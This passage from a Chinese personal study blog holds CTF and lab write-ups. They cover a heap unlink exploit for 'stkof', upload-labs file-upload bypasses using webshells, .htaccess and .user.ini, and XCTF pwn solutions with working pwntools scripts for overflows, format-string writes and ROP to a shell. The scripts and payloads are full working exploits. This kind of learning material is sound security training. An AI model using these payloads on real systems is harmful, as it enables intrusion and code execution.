<p>0是伪造堆块的prev_size，0x30是size</p>
<p>0x602138是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在伪造堆块的fd位置</p>
<p>0x602140是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在位置堆块的bk位置</p>
<p>然后覆盖chunk3的prev_size为0x30，size为0x90，让系统以为伪造的堆块处于空闲状态</p>
<p>进行free（3）的操作后，判断伪造的chunk2是处于空闲状态，然后判断</p>
<p>p-&gt; fd-&gt; bk = = p 和 p-&gt; bk-&gt; fd ==p，这里p-&gt; fd=0x602138，然后从0x602138取4个地址偏移的位置（看成一个0x602138起始的堆块取bk），刚刚好是全局指针0x602150=&gt;0x2846460=p，验证通过，然后p-&gt; bk-&gt; fd ==p的过程同上。</p>
<p>然后进行unlink操作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++">FD = p-&gt;fd;<br>BK = p-&gt;bk;<br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>
<p>这里FD-&gt;bk和BK-&gt;fd都是chunk2在全局变量指针中的地址，最后会进行BK-&gt;fd = FD，把伪造chunk2的FD复制到chunk2全局变量指针的位置，结果如下</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213704244.png" alt="最后进行的BK->fd操作" style="zoom:67%;">
<p>可以看到0x602150（原来chunk2的指针位置）被覆盖成了伪造chunk2的FD（0x602138）</p>
<p>然后进行修改chunk2的操作（先从全局变量取指针0x602150-&gt;0x602138），然后就可以修改0x602138的位置的内容，这时把chunk1的全局变量指针改为free的got表地址，chunk2的全局变量指针改为put的plt表地址（用于put出put函数真实地址）</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213750481.png" alt="编辑chunk1" style="zoom:67%;">
<p>这里0x602148和0x602150已经被修改为free_got和put_plt</p>
<p>然后进行修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址</p>
<p>进行free（2）的操作，实际上是put出put_plt泄露出真实地址</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213836064.png" alt="泄露的put真实地址" style="zoom:67%;">
<p>后续操作就是计算system已经/bin/sh的地址了，最后同上修改free的got表地址为system的地址，修改chunk4为/bin/sh，进行free（4）的操作就可以了。</p>
<p>脚本如下，参考了https://bbs.pediy.com/thread-247007.htm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br> <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br> <br>context(log_level = <span class="hljs-string">&quot;debug&quot;</span>,os = <span class="hljs-string">&quot;linux&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./stkof&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">malloc</span>(<span class="hljs-params">size</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,strings</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    p.send(strings)<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br>malloc(<span class="hljs-number">0x20</span>)<br>malloc(<span class="hljs-number">0x30</span>)<br>malloc(<span class="hljs-number">0x80</span>)<br>malloc(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#创建4个堆快，第三个用来free的堆快不能是fastbin</span><br><br>target = <span class="hljs-number">0x602140</span> + <span class="hljs-number">0x10</span><br>fd = target - <span class="hljs-number">0x18</span><br>bk = target - <span class="hljs-number">0x10</span><br><br>payload = p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#伪造堆块的prev_size</span><br>payload += p64(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#伪造堆块的size</span><br>payload += p64(fd) + p64(bk)<br>payload += <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span><br>payload += p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0x90</span>)  <span class="hljs-comment">#更改chunk3的标志位，会认为前一个堆快是空闲的触发unlink</span><br>edit(<span class="hljs-number">2</span>,payload)<br><br>free(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br> <br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span> <br>payload2 += p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload2)<br><br>payload3 = p64(puts_plt)<br>edit(<span class="hljs-number">1</span>,payload3)<br><span class="hljs-comment">#修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址 </span><br>free(<span class="hljs-number">2</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\nOK\n&quot;</span>,drop = <span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>puts_offset = libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_offset = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binp_offset = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br> <br>libc_base = puts_addr - puts_offset<br> <br>system_addr = libc_base + system_offset<br> <br>payload4 = p64(system_addr)<br><br>edit(<span class="hljs-number">1</span>,payload4)<br><span class="hljs-comment">#再次修改chunk1，把free_got修改为system的地址</span><br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN学习</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs 学习</title>
    <url>/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="upload-labs-学习"><a class="markdownIt-Anchor" href="#upload-labs-学习"></a> upload-labs 学习</h1>
<h2 id="pass-1"><a class="markdownIt-Anchor" href="#pass-1"></a> Pass-1</h2>
<p>直接上传webshell，发现报错，提示只能上传.jpg|.png|.gif类型的文件。</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image002.jpg" alt="img"></p>
<p>先把webshell的后缀改成jpg，然后上传，使用Burp抓包</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image004.jpg" alt="img"></p>
<p>圈住的地方是上传的文件名字，改成1.php，然后发送</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image006.jpg" alt="img"></p>
<p>可以看到成功上传了</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image008.jpg" alt="img"></p>
<p>使用菜刀可以成功连接</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image010.jpg" alt="img"></p>
<h2 id="pass-2"><a class="markdownIt-Anchor" href="#pass-2"></a> Pass-2</h2>
<p>同样的方法，先把webshell的后缀改成jpg，然后抓包上传</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image012.jpg" alt="img"></p>
<p>这次把名字改成2.php，方便区分</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image014.jpg" alt="img"></p>
<p>菜刀连接成功</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image016.jpg" alt="img"></p>
<h2 id="pass-3"><a class="markdownIt-Anchor" href="#pass-3"></a> Pass-3</h2>
<p>这里发现使用上面方法已经不行了，上传之后会被提示不允许上传asp，aspx，php，jsp后缀文件，应该是黑名单过滤</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image018.jpg" alt="img"></p>
<p>关于Apache服务器的一些绕过知识：</p>
<p>可以上传例如php3, phtml后缀的文件绕过，前提是Apache的httpd.conf中配置有如下代码:</p>
<p>AddType application/x-httpd-php .php .php3 .phtml</p>
<p>服务器会将.php3, .phtml后缀的文件当成.php解析</p>
<p>所以尝试上传.php3的文件</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image020.jpg" alt="img"></p>
<p>可以看到成功上传了</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image022.jpg" alt="img"></p>
<p>不过这里会被重命名</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image024.jpg" alt="img"></p>
<p>用菜刀能连接上</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image026.jpg" alt="img"></p>
<h2 id="pass-4"><a class="markdownIt-Anchor" href="#pass-4"></a> Pass-4</h2>
<p><strong>注：这里需要5.6版本以下且未开启nts的php</strong></p>
<p>查看源码，还是黑名单过滤，发现过滤了大多数文件名</p>
<p>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);</p>
<p>但是没有过滤.htaccess文件</p>
<p><strong>.htaccess****文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置</strong>。</p>
<p>就是说，我们只要能上传这个文件，就可以改变相应目录下的文件配置</p>
<p>首先上传一个.htaccess文件内容为</p>
<p>SetHandler application/x-httpd-php</p>
<p>作用是使所有文件都被解析成PHP</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image028.jpg" alt="img"></p>
<p>抓包把文件名改为.htaccess</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image030.jpg" alt="img"></p>
<p>这时应该成功上传了</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image0322.jpg" alt="img"></p>
<p>然后尝试上传一个jpg的马</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image034.jpg" alt="img"></p>
<p>菜刀连接不上，但是这个jpg是确实可以解析成php的，把jpg内容修改为如下，重新上传</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image036.jpg" alt="img"></p>
<p>这个时候访问就可以看到jpg已经被解析为php了</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image038.jpg" alt="img"></p>
<h2 id="pass-5"><a class="markdownIt-Anchor" href="#pass-5"></a> Pass-5</h2>
<p>查看源码过滤了.htaccess文件，而提示是上传目录存在readme.php文件</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image040.jpg" alt="img"><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image042.jpg" alt="img"></p>
<p>这里我们用到一个.user.ini的文件，.user.ini实际上就是一个可以由用户“自定义”的php.ini，而有些配置项可以用来利用，比如auto_append_file，可以指定一个文件，自动包含在要执行的文件前，所以我们先上传一个名为.user.ini的文件，内容是auto_prepend_file=1.gif</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image044.jpg" alt="img"></p>
<p>然后我们上传一个1.gif的文件，内容为</p>
<?php

 phpinfo(); 

?>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image046.jpg" alt="img"></p>
<p>当我们访问readme.php时，就可以调用1.gif的内容了</p>
<p>如下，可以看到这里1.gif中的phpinfo函数被调用了</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image048.jpg" alt="img"></p>
<h2 id="pass-6"><a class="markdownIt-Anchor" href="#pass-6"></a> Pass-6</h2>
<p>这里查看源码，里面相对pass-4少了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><msub><mi>e</mi><mi>e</mi></msub><mi>x</mi><mi>t</mi><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>t</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">file_ext = strtolower(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span></span></span></span>file_ext); //转换为小写</p>
<p>这段代码，尝试采用.phP格式上传绕过</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image050.jpg" alt="img"></p>
<p>这里上传成功了</p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image052.jpg" alt="img"></p>
<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image054.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>web学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>web学习</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界刷题记录</title>
    <url>/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="攻防世界-pwn-int_overflow-整数溢出"><a class="markdownIt-Anchor" href="#攻防世界-pwn-int_overflow-整数溢出"></a> 攻防世界-pwn-int_overflow-整数溢出</h1>
<p>1.先检查程序，没有开启canary和pie</p>
<p>​         <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101322876.png" alt="image-20210413101322876"></p>
<p>2.使用ida查看函数，main函数里会让你输入一个数字，当输入1时调用login()</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101524638.png" alt="image-20210413101524638"></p>
<p>查看login()函数</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101553522.png" alt="image-20210413101553522"></p>
<p>这里的第二个read函数读取的长度为0x199</p>
<p>然后再查看check_passwd函数</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101615917.png" alt="image-20210413101615917"></p>
<p>这里的v3是unsigned_int8型，存储8个字节，最多存储256个长度，这里可以进行整数溢出，下面的代码只要v3&gt;3或者v3&lt;8就可以通过验证，所以v3可以是259-264或者3-8个长度</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101639471.png" alt="image-20210413101639471"></p>
<p>3.继续观察函数，发现下面存在strcpy()函数存在栈溢出，但是&amp;dest的栈有14个字节，所以我们得让v3整数溢出通过上面的判断，然后在偏移为14+ebp的时候写入后门函数的地址</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101700572.png" alt="image-20210413101700572"></p>
<p>后门函数地址为0x0804868B</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101715484.png" alt="image-20210413101715484"></p>
<p>所以编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>cat_flag=<span class="hljs-number">0x0804868B</span>  <span class="hljs-comment">#后门函数地址</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;39309&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Please input your username:\n&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>)<br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(cat_flag)+<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">260</span>-<span class="hljs-number">0x14</span>-<span class="hljs-number">4</span>-<span class="hljs-number">4</span>)  <br><span class="hljs-comment">#&#x27;A&#x27;*0x14是到栈底的偏移量，&#x27;a&#x27;*4是ebp，最后填充的A需要补充长度到260才能导致整数溢出</span><br>p.sendlineafter(<span class="hljs-string">&quot;Please input your passwd:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-cgfsb-格式化字符串写入"><a class="markdownIt-Anchor" href="#攻防世界-pwn-cgfsb-格式化字符串写入"></a> 攻防世界-pwn-CGfsb-格式化字符串写入</h1>
<p>1.首先检查程序</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102120434.png" alt="image-20210413102120434"></p>
<p>32位程序，开启了canary保护和nx</p>
<p>2.用ida打开查看函数，发现其中有一个printf(&amp;s)存在明显的栈溢出</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102138548.png" alt="image-20210413102138548"></p>
<p>在第二次输入message时输入aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p可以知道偏移为10</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102154558.png" alt="image-20210413102154558"></p>
<p>3.再次查看函数，里面有一段判断如果pwnme=8，则得到flag，所以我们可以用格式化字符串的漏洞覆盖pwnme的值</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102219355.png" alt="image-20210413102219355"></p>
<p>4.用ida查看pwnme的地址为0x0804A068，写出payload</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102248705.png" alt="image-20210413102248705"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;39393&#x27;</span>)<br>pwnme_addr=<span class="hljs-number">0x0804A068</span>         <span class="hljs-comment">#pwnme的地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;please tell me your name:\n&quot;</span>,<span class="hljs-string">&quot;abab&quot;</span>)<br>payload=p32(pwnme_adddr)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&#x27;%10$n&#x27;</span>    <br><span class="hljs-comment">#利用格式化字符串在pwnme的地址写入8，因为pwnme的地址占4字节，再补充4*a到8，就可以使pwnme的值为8</span><br>p.sendlineafter(<span class="hljs-string">&quot;leave your message please:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-cgpwn2-32位rop链构造"><a class="markdownIt-Anchor" href="#攻防世界-pwn-cgpwn2-32位rop链构造"></a> 攻防世界-pwn-cgpwn2-32位rop链构造</h1>
<p>1.先用checksec检查程序的保护</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102641981.png" alt="image-20210413102641981"></p>
<p>没有开启canary，然后使用ida查看代码，发现hello函数有一次存在栈溢出</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102711827.png" alt="image-20210413102711827"></p>
<p>并且发现name存在于bss中的地址是固定的0x0804A080</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102724230.png" alt="image-20210413102724230"></p>
<p>我们可以在name这个地方存储’/bin/sh’作为system的参数调用</p>
<p>Hello函数中存在一个get函数作为溢出点</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102741169.png" alt="image-20210413102741169"></p>
<p>离栈底为0x26</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102759807.png" alt="image-20210413102759807"></p>
<p>这时可以编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>elf = ELF(<span class="hljs-string">&quot;./cgpwn2&quot;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;50628&#x27;</span>)<br><br>sys_addr=elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]   <span class="hljs-comment">#获取system的地址</span><br>name_addr=<span class="hljs-number">0x804a080</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;please tell me your name\n&quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)   <span class="hljs-comment">#将/bin/sh写入name</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x26</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(sys_addr)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(name_addr)     <span class="hljs-comment">#32位的程序rop链构造，name中存放的数据作为system的参数</span><br>p.sendlineafter(<span class="hljs-string">&quot;hello,you can leave some message here:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-forgot-栈溢出"><a class="markdownIt-Anchor" href="#攻防世界-pwn-forgot-栈溢出"></a> 攻防世界 pwn-forgot-栈溢出</h1>
<ol>
<li>先检查程序，发现只开启了nx保护</li>
</ol>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103114866.png" alt="image-20210413103114866"></p>
<ol start="2">
<li>观察函数发现scanf函数存在栈溢出。</li>
</ol>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103154789.png" alt="image-20210413103154789"></p>
<p>再次观察其他函数发现存在一个后门函数可以直接拿到flag</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103221109.png" alt="image-20210413103221109"></p>
<p>先使用gdb进行调试，随便输入一些数据，发现最后返回的在ida里地址为0x80486CC的函数，在主函数中定义为v4</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103238325.png" alt="image-20210413103238325"></p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103251099.png" alt="image-20210413103251099"></p>
<p>观察ida里其他函数，发现一个后门函数，地址为0x80486CC考虑使用栈溢出去执行它</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103303074.png" alt="image-20210413103303074"></p>
<p>在ida中查看栈空间可知，v4函数距离scantf输入的变量v2的偏移量为0x24</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103429828.png" alt="image-20210413103429828"></p>
<p>编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">33397</span>)<br>backaddr=<span class="hljs-number">0x80486CC</span>     <span class="hljs-comment">#后门函数地址</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;text&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+p32(backaddr)     <span class="hljs-comment">#覆盖v4的地址为后门函数</span><br>p.sendline(payload)<br>p.interactive()	